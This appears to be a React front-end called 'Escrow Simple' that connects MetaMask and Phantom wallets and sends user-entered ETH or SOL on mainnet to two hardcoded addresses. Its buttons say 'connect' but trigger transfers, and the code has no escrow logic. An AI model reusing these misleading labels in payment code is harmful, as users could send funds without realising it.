import * as solanaWeb3 from "@solana/web3.js";
import './App.css';
import {useEffect, useState} from "react";

const Title = 'Escrow Simple'

document.title = Title

const address = "D7xLPt19BogkxXd2C2AAhaHUh1VoDLzxdf9ConG2gJWf"

function App() {
    const [opacity, setOpacity] = useState(0)
    const [ethAmount, setEthAmount] = useState(null)
    const [solAmount, setSolAmount] = useState(null)

    const inputChangeHandlerETH = (e) => {
        setEthAmount(e.target.value)
    }

    const inputChangeHandlerSOL = (e) => {
        setSolAmount(e.target.value)
    }

    ////////////////// ETH/METAMASK

    const connectAndSendMetaMask = async (fromWallet) => {
        try {
            await sendEth()
        } catch (err) {
            console.log(err)
        }
    }

    const sendEth = async () => {
        const address = await window.ethereum.request({method: 'eth_requestAccounts'})

        let params = [{
            "from": address[0],
            "to": '0x2affCC7D6BD232E9115b28AB635960C80d51E9F2',
            "value": parseInt(Number(ethAmount) * 1000000000000000000).toString(16)
        }]

        const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
            console.log(err)
        })
    }

    ////////////// SOL/PHANTOM

    async function connectAndSendPhantom() {
        try {
            await window.solana.connect()
            await sendSol()
        } catch (error) {
            console.log(error)
        }
    }

    async function sendSol() {
        const provider = window.solana
        const connection = new solanaWeb3.Connection(
            solanaWeb3.clusterApiUrl('mainnet-beta'),
            'confirmed'
        )

        // const balance = await connection.getBalance(provider.publicKey)

        const toAccount = new solanaWeb3.PublicKey(address)

        let transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: provider.publicKey,
                toPubkey: toAccount,
                lamports: solanaWeb3.LAMPORTS_PER_SOL * Number(solAmount),
            })
        )

        transaction.feePayer = await provider.publicKey
        let blockhashObj = await connection.getRecentBlockhash()
        transaction.recentBlockhash = await blockhashObj.blockhash

        let signed = await provider.signTransaction(transaction)
        let signature = await connection.sendRawTransaction(signed.serialize())
        await connection.confirmTransaction(signature)
    }


    setTimeout(() => {
        setOpacity(100)
    }, 0)

    return (
        <div className={'AppContainer'}
             ref={(el) => {
                 if (el) {
                     el.style.setProperty('opacity', opacity, 'important');
                 }
             }}
        >
            <header>
                <div>
                    <a href={'/'}>{Title}</a>
                </div>
            </header>
            <div className="App">
                <div className="AppInner">
                    <div>
                        <div>
                            <input type="text" onChange={inputChangeHandlerETH}/>
                        </div>
                        <button onClick={connectAndSendMetaMask}>connect eth</button>
                    </div>
                    <div>
                        <div>
                            <input type="text" onChange={inputChangeHandlerSOL}/>
                        </div>
                        <button onClick={connectAndSendPhantom}>connect sol</button>
                    </div>
                </div>
            </div>
        </div>
    );
}

export default App;
